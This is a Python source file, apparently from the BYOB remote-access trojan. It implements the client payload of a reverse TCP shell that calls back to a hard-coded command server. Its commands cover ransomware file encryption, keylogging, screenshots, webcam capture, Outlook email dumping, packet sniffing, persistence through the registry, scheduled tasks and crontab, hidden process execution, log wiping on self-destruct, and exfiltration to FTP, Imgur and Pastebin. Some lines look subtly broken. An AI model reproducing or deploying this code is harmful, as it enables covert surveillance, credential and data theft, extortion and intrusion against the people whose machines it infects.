        elif hasattr(self, name):
            try:
                return help(getattr(self, name))
            except Exception as e:
                log("{} error: {}".format(self.help.func_name, str(e)))
        else:
            return "'{}' is not a valid command and is not a valid module".format(name)

    @config(platforms=['win32','linux2','darwin'], command=True, usage='load <module> [target]')
    def load(self, args):
        """ 
        Remotely import a module or package

        `Required`
        :param str module:  name of module/package

        `Optional`
        :param str target:  name of the target destination (default: globals)

        """
        args = str(args).split()
        if len(args) == 1:
            module, target = args[0], ''
        elif len(args) == 2:
            module, target = args
        else:
            return "usage: {}".format(self.load.usage)
        target = globals()[target].__dict__ if bool(target in globals() and hasattr(target, '__dict__')) else globals()
        host, port = self.connection.getpeername()
        base_url_1 = 'http://{}:{}'.format(host, port + 1)
        base_url_2 = 'http://{}:{}'.format(host, port + 2)
        with globals()['remote_repo'](self.remote['modules'], base_url_1):
            with globals()['remote_repo'](self.remote['packages'], base_url_2):
                try:
                    exec('import {}'.format(module), target)
                    log('[+] {} remotely imported'.format(module))
                except Exception as e:
                    log("{} error: {}".format(self.load.func_name, str(e)))

    @config(platforms=['win32','linux2','darwin'], command=True, usage='stop <job>')
    def stop(self, target):
        """ 
        Stop a running job

        `Required`
        :param str target:    name of job to stop
        """
        try:
            if target in self.handlers:
                _ = self.handlers.pop(target, None)
                del _
                return "Job '{}' was stopped.".format(target)
            else:
                return "Job '{}' not found".format(target)
        except Exception as e:
            log("{} error: {}".format(self.stop.func_name, str(e)))

    @config(platforms=['win32','linux2','darwin'], command=True, usage='show <value>')
    def show(self, attribute):
        """ 
        Show value of an attribute

        `Required`
        :param str attribute:    payload attribute to show

        Returns attribute(s) as a dictionary (JSON) object
        """
        try:
            attribute = str(attribute)
            if 'jobs' in attribute:
                return json.dumps({a: status(_threads[a].name) for a in self.handlers if self.handlers[a].is_alive()})
            elif 'privileges' in attribute:
                return json.dumps({'username': self.info.get('username'),  'administrator': 'true' if bool(os.getuid() == 0 if os.name is 'posix' else ctypes.windll.shell32.IsUserAnAdmin()) else 'false'})
            elif 'info' in attribute:
                return json.dumps(self.info)
            elif hasattr(self, attribute):
                try:
                    return json.dumps(getattr(self, attribute))
                except:
                    try:
                        return json.dumps(vars(getattr(self, attribute)))
                    except: pass
            elif hasattr(self, str('_%s' % attribute)):
                try:
                    return json.dumps(getattr(self, str('_%s' % attribute)))
                except:
                    try:
                        return json.dumps(vars(getattr(self, str('_%s' % attribute))))
                    except: pass
            else:
                return self.show.usage
        except Exception as e:
            log("'{}' error: {}".format(_threads.func_name, str(e)))

    @config(platforms=['win32','linux2','darwin'], command=True, usage='abort')
    def abort(self, *args):
        """ 
        Abort tasks, close connection, and self-destruct leaving no trace on the disk

        """
        globals()['_abort'] = True
        try:
            if os.name is 'nt':
                clear_system_logs()
            if 'persistence' in globals():
                global persistence
                for method in persistence.methods:
                    if persistence.methods[method].get('established'):
                        try:
                            remove = getattr(persistence, 'remove_{}'.format(method))()
                        except Exception as e2:
                            log("{} error: {}".format(method, str(e2)))
            if not _debug:
                delete(sys.argv[0])
        finally:
            shutdown = threading.Thread(target=self.connection.close)
            taskkill = threading.Thread(target=self.process, args=('kill python',))
            shutdown.start()
            taskkill.start()
            sys.exit()

    @config(platforms=['win32','linux2','darwin'], command=True, usage='unzip <file>')
    def unzip(self, path):
        """ 
        Unzip a compressed archive/file

        `Required`
        :param str path:    zip archive filename

        """
        if os.path.isfile(path):
            try:
                _ = zipfile.ZipFile(path).extractall('.')
                return os.path.splitext(path)[0]
            except Exception as e:
                log("{} error: {}".format(self.unzip.func_name, str(e)))
        else:
            return "File '{}' not found".format(path)

    @config(platforms=['win32','linux2','darwin'], command=True, usage='sms <send/read> [args]')
    def phone(self, args):
        """ 
        Use an online phone to send text messages

        `Required`
        :param str phone:     recipient phone number
        :param str message:   text message to send

        `Optional`
        :param str account:   Twilio account SID 
        :param str token:     Twilio auth token 
        :param str api:       Twilio api key

        """
        if 'phone' not in globals():
            globals()['phone'] = self.load('phone')
        args = globals()['kwargs'](args)
        if all():
            return globals()['phone'].run(number=args.number, message=args.message, sid=args.sid, token=args.token)
        else:
            return 'usage: <send/read> [args]\n  arguments:\n\tphone    :   phone number with country code - no spaces (ex. 18001112222)\n\tmessage :   text message to send surrounded by quotes (ex. "example text message")'

    @config(platforms=['win32','linux2','darwin'], command=False)
    def imgur(self, source, api_key=None):
        """ 
        Upload image file/data to Imgur

        `Required`
        :param str source:    data or filename

        """
        try:
            if api_key:
                if not isinstance(api_key, str):
                    raise TypeError("argument 'api_key' data type must be: {}".format(str))
                if not api_key.lower().startswith('client-id'):
                    api_key  = 'Client-ID {}'.format(api_key)
                if 'normalize' in globals():
                    source = normalize(source)
                post = post('https://api.imgur.com/3/upload', headers={'Authorization': api_key}, data={'image': base64.b64encode(source), 'type': 'base64'})
                return str(json.loads(post)['data']['link'])
            else:
                return "No Imgur API Key found"
        except Exception as e2:
            return "{} error: {}".format(self.imgur.func_name, str(e2))

    @config(platforms=['win32','linux2','darwin'], command=True, usage='upload <mode> [file]')
    def upload(self, args):
        """ 
        Upload file to an FTP server, Imgur, or Pastebin

        `Required`
        :param str mode:      ftp, imgur, pastebin
        :param str source:    data or filename

        """
        try:
            mode, _, source = str(args).partition(' ')
            if not source:
                return self.upload.usage + ' -  mode: ftp, imgur, pastebin'
            elif mode not in ('ftp','imgur','pastebin'):
                return "{} error: invalid mode '{}'".format(self.upload.func_name, str(mode))
            else:
                return getattr(self, mode)(source)
        except Exception as e:
            log("{} error: {}".format(self.upload.func_name, str(e)))
            return "Error: {}".format(str(e))

    @config(platforms=['win32','linux2','darwin'], registry_key=r"Software\BYOB", command=True, usage='ransom <mode> [path]')
    def ransom(self, args):
        """ 
        Ransom personal files on the client host machine using encryption

        `Required`
        :param str mode:        encrypt, decrypt, payment
        :param str target:      target filename or directory path

        """
        if 'ransom' not in globals():
            self.load('ransom')
        return globals()['ransom'].run(args)


    @config(platforms=['win32','linux2','darwin'], command=True, usage='webcam <mode> [options]')
    def webcam(self, args=None):
        """ 
        View a live stream of the client host machine webcam or capture image/video

        `Required`
        :param str mode:      stream, image, video

        `Optional`
        :param str upload:    imgur (image mode), ftp (video mode)
        :param int port:      integer 1 - 65355 (stream mode)
        
        """
        try:
            if 'webcam' not in globals():
                self.load('webcam')
            if not args:
                return self.webcam.usage
            args = str(args).split()
            if 'stream' in args:
                if len(args) != 2:
                    result = "Error - stream mode requires argument: 'port'"
                elif not args[1].isdigit():
                    result = "Error - port must be integer between 1 - 65355"
                else:
                    result = globals()['webcam'].stream(port=args[1])
            else:
                result = globals()['webcam'].image(*args) if 'video' not in args else globals()['webcam'].video(*args)
        except Exception as e:
            result = "{} error: {}".format(self.webcam.func_name, str(e))
            log(result)
        return result

    @config(platforms=['win32','linux2','darwin'], command=True, usage='passive')
    def passive(self):
        """ 
        Enter passive mode, re-attempting to establish a connection
        with the server every 30 seconds

        """
        self.flags['connection'].clear()
        self._get_connection()
        

    @config(platforms=['win32','linux2','darwin'], command=True, usage='restart [output]')
    def restart(self, output='connection'):
        """ 
        Restart the shell

        """
        try:
            log("{} failed - restarting in 3 seconds...".format(output))
            self.kill()
            time.sleep(3)
            os.execl(sys.executable, 'python', os.path.abspath(sys.argv[0]), *sys.argv[1:])
        except Exception as e:
            log("{} error: {}".format(self.restart.func_name, str(e)))

    @config(platforms=['win32','darwin'], command=True, usage='outlook <option> [mode]')
    def outlook(self, args=None):
        """ 
        Access Outlook email in the background without authentication

        `Required`
        :param str mode:    count, dump, search, results

        `Optional`
        :param int n:       target number of emails (upload mode only)

        """
        if 'outlook' not in globals():
            self.load('outlook')
        elif not args:
            try:
                if not globals()['outlook'].installed():
                    return "Error: Outlook not installed on this host"
                else:
                    return "Outlook is installed on this host"
            except: pass
        else:
            try:
                mode, _, arg   = str(args).partition(' ')
                if hasattr(globals()['outlook'] % mode):
                    if 'dump' in mode or 'upload' in mode:
                        self.handlers['outlook'] = threading.Thread(target=getattr(globals()['outlook'], mode), kwargs={'n': arg}, name=time.time())
                        self.handlers['outlook'].daemon = True
                        self.handlers['outlook'].start()
                        return "Dumping emails from Outlook inbox"
                    elif hasattr(globals()['outlook'], mode):
                        return getattr(globals()['outlook'], mode)()
                    else:
                        return "Error: invalid mode '%s'" % mode
                else:
                    return "usage: outlook [mode]\n    mode: count, dump, search, results"
            except Exception as e:
                log("{} error: {}".format(self.email.func_name, str(e)))

    @config(platforms=['win32','linux2','darwin'], process_list={}, command=True, usage='execute <path> [args]')
    def execute(self, args):
        """ 
        Run an executable program in a hidden process

        `Required`
        :param str path:    file path of the target program

        `Optional`
        :param str args:    arguments for the target program
        
        """
        path, args = [i.strip() for i in args.split('"') if i if not i.isspace()] if args.count('"') == 2 else [i for i in args.partition(' ') if i if not i.isspace()]
        args = [path] + args.split()
        if os.path.isfile(path):
            name = os.path.splitext(os.path.basename(path))[0]
            try:
                info = subprocess.STARTUPINFO()
                info.dwFlags = subprocess.STARTF_USESHOWWINDOW ,  subprocess.CREATE_NEW_ps_GROUP
                info.wShowWindow = subprocess.SW_HIDE
                self.execute.process_list[name] = subprocess.Popen(args, startupinfo=info)
                return "Running '{}' in a hidden process".format(path)
            except Exception as e:
                try:
                    self.execute.process_list[name] = subprocess.Popen(args, 0, None, None, subprocess.PIPE, subprocess.PIPE)
                    return "Running '{}' in a new process".format(name)
                except Exception as e:
                    log("{} error: {}".format(self.execute.func_name, str(e)))
        else:
            return "File '{}' not found".format(str(path))

    @config(platforms=['win32'], command=True, usage='process <mode>')
    def process(self, args=None):
        """ 
        Utility method for interacting with processes

        `Required`
        :param str mode:    block, list, monitor, kill, search

        `Optional`
        :param str args:    arguments specific to the mode
        
        """
        try:
            if 'process' not in globals():
                self.load('process')
            if not args:
                if hasattr(globals()['process'], 'usage'):
                    return globals()['process'].usage
                elif hasattr(self.process, 'usage'):
                    return self.process.usage
                else:
                    return "usage: process <mode>\n    mode: block, list, search, kill, monitor"
            cmd, _, action = str(args).partition(' ')
            if hasattr(globals()['process'], cmd):
                return getattr(globals()['process'], cmd)(action) if action else getattr(globals()['process'], cmd)()
            else:
                return "usage: process <mode>\n    mode: block, list, search, kill, monitor"
        except Exception as e:
            log("{} error: {}".format(self.process.func_name, str(e)))

    @config(platforms=['win32','linux2','darwin'], command=True, usage='portscan <mode> <target>')
    def portscan(self, args=None):
        """ 
        Scan a target host or network to identify 
        other target hosts and open ports.

        `Required`
        :param str mode:        host, network
        :param str target:      IPv4 address
        
        """
        if 'portscanner' not in globals():
            self.load('portscanner')
        try:
            if not args:
                return 'portscan <mode> <target>'
            mode, _, target = str(args).partition(' ')
            if not mode:
                return 'portscan <mode> <target>'
            if target:
                if not ipv4(target):
                    return "Error: invalid IP address '%s'" % target
            else:
                target = socket.gethostbyname(socket.gethostname())
            if hasattr(globals()['portscanner'], mode):
                return getattr(globals()['portscanner'], mode)(target)
            else:
                return "Error: invalid mode '%s'" % mode
        except Exception as e:
            log("{} error: {}".format(self.portscan.func_name, str(e)))

    def pastebin(self, source, api_key=None):
        """ 
        Dump file/data to Pastebin

        `Required`
        :param str source:      data or filename

        `Optional`
        :param str api_key:     Pastebin api_dev_key

        Returns URL of pastebin document as a string
        
        """
        try:
            if api_key:
                info = {'api_option': 'paste', 'api_paste_code': normalize(source), 'api_dev_key': api_key}
                paste = globals()['post']('https://pastebin.com/api/api_post.php',data=info)
                parts = urllib2.urlparse.urlsplit(paste)       
                return urllib2.urlparse.urlunsplit((parts.scheme, parts.netloc, '/raw' + parts.path, parts.query, parts.fragment)) if paste.startswith('http') else paste
            else:
                return "{} error: no pastebin API key".format(self.pastebin.func_name)
        except Exception as e:
            return '{} error: {}'.format(self.pastebin.func_name, str(e))

    @config(platforms=['win32','linux2','darwin'], command=True, usage='keylogger start/stop/dump/status')
    def keylogger(self, mode=None):
        """ 
        Log user keystrokes

        `Required`
        :param str mode:    run, stop, status, upload, auto
        
        """
        def status():
            try:
                mode    = 'stopped'
                if 'keylogger' in self.handlers:
                    mode= 'running'
                update  = status(float(self.handlers.get('keylogger').name))
                length  = globals()['keylogger']._buffer.tell()
                return "Status\n\tname: keylogger\n\tmode: {}\n\ttime: {}\n\tsize: {} bytes".format(mode, update, length)
            except Exception as e:
                log("{} error: {}".format('keylogger.status', str(e)))
        if 'keylogger' not in globals():
            self.load('keylogger')
        if not mode:
            if 'keylogger' not in self.handlers:
                return globals()['keylogger'].usage
            else:
                return locals()['status']()
        else:
            if 'run' in mode or 'start' in mode:
                if 'keylogger' not in self.handlers:
                    self.handlers['keylogger'] = globals()['keylogger'].run()
                    return locals()['status']()
                else:
                    return locals()['status']()
            elif 'stop' in mode:
                try:
                    self.stop('keylogger')
                except: pass
                try:
                    self.stop('keylogger')
                except: pass
                return locals()['status']()
            elif 'auto' in mode:
                self.handlers['keylogger'] = globals()['keylogger'].auto()
                return locals()['status']()
            elif 'upload' in mode:
                data = base64.b64encode(globals()['keylogger'].logs.getvalue())
                globals()['post']('http://{}:{}'.format(host, port), json={'data': data})
                globals()['keylogger'].logs.reset()
                return 'Upload complete'
            elif 'status' in mode:
                return locals()['status']()        
            else:
                return keylogger.usage + '\n\targs: start, stop, dump'

    @config(platforms=['win32','linux2','darwin'], command=True, usage='screenshot <mode>')
    def screenshot(self, mode=None):
        """ 
        Capture a screenshot from host device

        `Optional`
        :param str mode:   ftp, imgur (default: None)
        
        """
        try:
            if 'screenshot' not in globals():
                self.load('screenshot')
            img = globals()['screenshot'].run()
            data = {"png": img}
            host, port = self.connection.getpeername()
            globals()['post']('http://{}:{}'.format(host, port+3), json=data)
            return 'Screenshot complete'
        except Exception as e:
            result = "{} error: {}".format(self.screenshot.func_name, str(e))
            log(result) 
            return result

    @config(platforms=['win32','linux2','darwin'], command=True, usage='persistence <add/remove> [method]')
    def persistence(self, args=None):
        """ 
        Establish persistence on client host machine

        `Required`
        :param str target:    run, abort, methods, results

        `Methods`
        :method all:                All Methods
        :method registry_key:       Windows Registry Key
        :method scheduled_task:     Windows Task Scheduler
        :method startup_file:       Windows Startup File
        :method launch_agent:       Mac OS X Launch Agent
        :method crontab_job:        Linux Crontab Job
        :method hidden_file:        Hidden File
        
        """
        try:
            if not 'persistence' in globals():
                self.load('persistence')
            cmd, _, action = str(args).partition(' ')
            if cmd not in ('add','remove'):
                return self.persistence.usage + str('\nmethods: %s' % ', '.join(methods))
            for method in globals()['persistence']._methods:
                if action == 'all' or action == method:
                    getattr(globals()['persistence']._methods[method], cmd)()
            return json.dumps(persistence.results())
        except Exception as e:
            log("{} error: {}".format(self.persistence.func_name, str(e)))

    @config(platforms=['linux2','darwin'], capture=[], command=True, usage='packetsniffer mode=[str] time=[int]')
    def packetsniffer(self, args):
        """ 
        Capture traffic on local network

        `Required`
        :param str mode:        ftp, pastebin
        :param int seconds:     duration in seconds
        
        """
        try:
            if 'packetsniffer' not in globals():
                self.load('packetsniffer')
            args = globals()['kwargs'](args)
            if 'mode' not in args or args['mode'] not in ('ftp', 'pastebin'):
                return "keyword argument 'mode' is missing or invalid (use 'ftp' or 'pastebin')"
            else:
                mode = args['mode']
            if 'time' not in args or not str(args['time']).isdigit():
                length = 30
            else:
                length = args['time']
            self.handlers['packetsniffer'] = globals()['packetsniffer'](mode, seconds=length)
            return 'Capturing network traffic for {} seconds and uploading via {}'.format(length, mode)
        except Exception as e:
            log("{} error: {}".format(self.packetsniffer.func_name, str(e)))

    def send_task(self, task):
        """ 
        Send task results to the server

        `Task`
        :attr str uid:             task ID assigned by server
        :attr str task:            task assigned by server
        :attr str result:          task result completed by client
        :attr str session:         session ID assigned by server
        :attr datetime issued:     time task was issued by server
        :attr datetime completed:  time task was completed by client

        Returns True if succesfully sent task to server, otherwise False

        """
        try:
            if not 'session' in task:
                task['session'] = self.info.get('uid')
            if self.flags.connection.wait(timeout=1.0):
                data = globals()['encrypt_aes'](json.dumps(task), self.key)
                msg  = struct.pack('!L', len(data)) + data
                self.connection.sendall(msg)
                return True
            return False
        except Exception as e:
            log("{} error: {}".format(self.send_task.func_name, str(e)))

    def recv_task(self):
        """ 
        Receive and decrypt incoming task from server

        `Task`
        :attr str uid:             task ID assigned by server
        :attr str session:         client ID assigned by server
        :attr str task:            task assigned by server
        :attr str result:          task result completed by client
        :attr datetime issued:     time task was issued by server
        :attr datetime completed:  time task was completed by client

        """
        try:
            hdr_len = struct.calcsize('!L')
            hdr = self.connection.recv(hdr_len)
            msg_len = struct.unpack('!L', hdr)[0]
            msg = self.connection.recv(msg_len)
            data = globals()['decrypt_aes'](msg, self.key)
            return json.loads(data)
        except Exception as e:
            log("{} error: {}".format(self.recv_task.func_name, str(e)))

    def run(self):
        """ 
        Connect back to server via outgoing connection
        and initialize a reverse TCP shell

        """
        for target in ('resource_handler','prompt_handler','thread_handler'):
            if not bool(target in self.handlers and self.handlers[target].is_alive()):
                self.handlers[target] = getattr(self, '_get_{}'.format(target))()
        while True:
            if self.flags.connection.wait(timeout=1.0):
                if not self.flags.prompt.is_set():
                    task = self.recv_task()
                    if isinstance(task, dict) and 'task' in task:
                        cmd, _, action = task['task'].encode().partition(' ')
                        try:
                            command = self._get_command(cmd)
                            result = bytes(command(action) if action else command()) if command else bytes().join(subprocess.Popen(cmd, 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True).communicate())
                        except Exception as e:
                            result = "{} error: {}".format(self.run.func_name, str(e))
                            log(level='debug', info=result)
                        task.update({'result': result})
                        self.send_task(task)
                    self.flags.prompt.set()
            else:
                log("Connection timed out")
                break

if __name__ == '__main__':
    _payload = Payload(pastebin='', host='192.168.1.44', port='5555')
    _payload.run()